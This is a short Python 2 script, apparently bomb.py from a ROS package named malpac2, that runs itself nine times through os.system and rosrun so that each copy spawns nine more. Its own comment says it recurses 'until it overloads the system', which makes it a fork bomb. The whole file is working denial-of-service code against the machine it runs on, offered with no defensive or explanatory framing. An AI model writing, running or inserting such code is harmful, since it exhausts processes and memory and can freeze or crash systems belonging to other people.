#!/usr/bin/env python2
#this isn't important enough to license
#calls itself until it overloads the system
import os
import rospy

def suicide():
    #some math to speed up the process a little
    s = (((14**14 / 12)+123)/12.3)**4 
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")
    os.system("rosrun malpac2 bomb.py")

if __name__ == '__main__':
    suicide()
